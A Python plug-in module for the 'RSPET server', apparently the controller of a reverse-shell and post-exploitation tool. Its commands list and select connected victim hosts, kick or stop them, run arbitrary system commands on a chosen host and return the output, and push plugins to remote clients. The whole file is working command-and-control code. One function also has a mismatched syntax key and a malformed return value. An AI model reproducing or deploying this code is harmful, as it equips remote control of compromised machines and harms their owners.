"""
Plug-in module for RSPET server. Offer functions essential to server.
"""
from __future__ import print_function
from socket import error as sock_error
from Plugins.mount import Plugin, command

class Essentials(Plugin):
    """
    Class expanding Plugin.
    """

    @command("basic", "connected", "multiple")
    def help(self, server, args):
        """List commands available in current state or provide syntax for a command.

        Help: [command]"""
        ret = [None, 0, ""]
        if len(args) > 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["help"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[2] = server.help(args)
        return ret

    @command("basic")
    def list_hosts(self, server, args):
        """List all connected hosts."""
        ret = [None, 0, ""]
        hosts = server.get_hosts()
        if hosts:
            ret[2] += "Hosts:"
            for i in hosts:
                inf = hosts[i].info
                con = hosts[i].connection
                ret[2] += ("\n[%s] %s:%s %s-%s %s %s" % (i, con["ip"], con["port"],
                                                         inf["version"], inf["type"],
                                                         inf["systemtype"],
                                                         inf["hostname"]))
        else:
            ret[2] += "No hosts connected to the Server."
        return ret

    @command("connected", "multiple")
    def list_sel_hosts(self, server, args):
        """List selected hosts."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        ret[2] += "Selected Hosts:"
        for host in hosts:
            #tmp = hosts[i]
            inf = host.info
            con = host.connection
            ret[2] += ("\n[%s] %s:%s %s-%s %s %s" % (host.id, con["ip"], con["port"],
                                                     inf["version"], inf["type"],
                                                     inf["systemtype"],
                                                     inf["hostname"]))
        return ret

    @command("basic")
    def choose_host(self, server, args):
        """Select a single host.

        Help: <host ID>"""
        ret = [None, 0, ""]
        if len(args) != 1 or not args[0].isdigit():
            ret[2] = ("Syntax : %s" % self.__server_cmds__["choose_host"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[1], ret[2] = server.select([args[0]])
            ret[0] = "connected"
        return ret

    @command("basic")
    def select(self, server, args):
        """Select multiple hosts.

        Help: <host ID> [host ID] [host ID] ..."""
        ret = [None, 0, ""]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["select"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[1], ret[2] = server.select(args)
            ret[0] = "multiple"
        return ret

    @command("basic")
    def all(self, server, args):
        """Select all hosts."""
        ret = [None, 0, ""]
        ret[1], ret[2] = server.select(None)
        ret[0] = "all"
        return ret

    @command("connected", "multiple")
    def exit(self, server, args):
        """Unselect all hosts."""
        ret = [None, 0, ""]
        ret[0] = "basic"
        return ret

    @command("basic")
    def quit(self, server, args):
        """Quit the CLI and terminate the server."""
        ret = [None, 0, ""]
        server.quit()
        return ret

    @command("connected", "multiple")
    def close_connection(self, server, args):
        """Kick the selected host(s)."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        for host in hosts:
            try:
                host.trash()
            except sock_error:
                pass
        ret[0] = "basic"
        return ret

    @command("connected")
    def kill(self, server, args):
        """Stop host(s) from doing the current task."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        for host in hosts:
            try:
                host.send(host.command_dict['KILL'])
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
        return ret

    @command("connected")
    def execute(self, server, args):
        """Execute system command on host.

        Help: <command>"""
        ret = [None, 0, ""]
        host = server.get_selected()[0]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["execute"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            command = " ".join(args)
            try:
                host.send(host.command_dict['command'])
                host.send("%013d" % len(command))
                host.send(command)
                respsize = int(host.recv(13))
                ret[2] += str(host.recv(respsize))
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
        return ret

    @command("basic")
    def install_plugin(self, server, args):
        """Download an official plugin (Install).

        Help: <plugin> [plugin] [plugin] ..."""
        ret = [None, 0, ""]
        for plugin in args:
            server.install_plugin(plugin)
        return ret

    @command("basic")
    def load_plugin(self, server, args):
        """Load an already installed plugin.

        Help: <plugin> [plugin] [plugin] ..."""
        ret = [None, 0, ""]
        for plugin in args:
            server.load_plugin(plugin)
        return ret

    @command("basic")
    def available_plugins(self, server, args):
        """List plugins available online."""
        ret = [None, 0, ""]
        avail_plug = server.available_plugins()
        ret[2] += "Available Plugins:"
        for plug in avail_plug:
            plug_dct = avail_plug[plug]
            ret[2] += ("\n\t%s: %s" % (plug, plug_dct["doc"]))
        return ret

    @command("basic")
    def installed_plugins(self, server, args):
        """List installed plugins."""
        ret = [None, 0, ""]
        inst_plug = server.installed_plugins()
        ret[2] += "Installed Plugins:"
        for plug in inst_plug:
            ret[2] += ("\n\t%s: %s" % (plug, inst_plug[plug]))
        return ret

    @command("basic")
    def loaded_plugins(self, server, args):
        """List loaded plugins."""
        ret = [None, 0, ""]
        load_plug = server.plugins["loaded"]
        ret[2] += "Loaded Plugins:"
        for plug in load_plug:
            ret[2] += ("\n\t%s: %s" % (plug, load_plug[plug]))
        return ret

    @command("connected")
    def client_load_plugin(self, server, args):
        """Load plugin on remote client."""
        ret = [None,0,""]
        hosts = server.get_selected()
        if len(args) < 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["client_install_plugin"].__syntax__)
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            cmd = args[0]
            for host in hosts:
                try:
                    host.send(host.command_dict['loadPlugin'])
                    host.send("%03d" % len(cmd))
                    host.send(cmd)
                    if host.recv(3) == 'pnl':
                        ret = [4] # RemoteAccessError Code
                    else:
                        host.info["plugins"].append(cmd)
                except sock_error:
                    host.purge()
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret
